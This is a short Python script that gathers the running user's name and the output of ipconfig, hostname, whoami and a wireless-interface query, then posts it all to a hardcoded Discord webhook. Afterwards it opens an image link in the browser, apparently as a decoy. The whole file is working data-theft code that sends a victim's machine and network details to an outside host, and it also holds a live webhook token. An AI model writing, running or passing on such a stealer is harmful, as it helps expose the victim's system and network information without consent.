import os
import requests
import subprocess


webhook_url = "https://discord.com/api/webhooks/1335647743674417223/q_JbzXlKBtyaZMSRgGBULKzOceb8PgRmwsoqDqvSvOjTpC7-FTzF4icTlZFSQGRNozVX"


username = os.getenv("USER") or os.getenv("USERNAME")


info = []
info.append(f"{username}'s data:\n")
info.append("\n")
info.append(subprocess.getoutput("ipconfig"))
info.append("\n")
info.append(subprocess.getoutput("hostname"))
info.append("\n")
info.append(subprocess.getoutput("whoami"))
info.append("\n")
info.append(subprocess.getoutput("netsh wlan show interfaces"))
info.append("\n")
info.append("-----------------------------------------\n")


message = "\n".join(info)

json_payload = {
    "content": message
}


response = requests.post(webhook_url, json=json_payload)

import webbrowser
webbrowser.open("https://i.ibb.co/b56R1Yq5/My-banner.png")
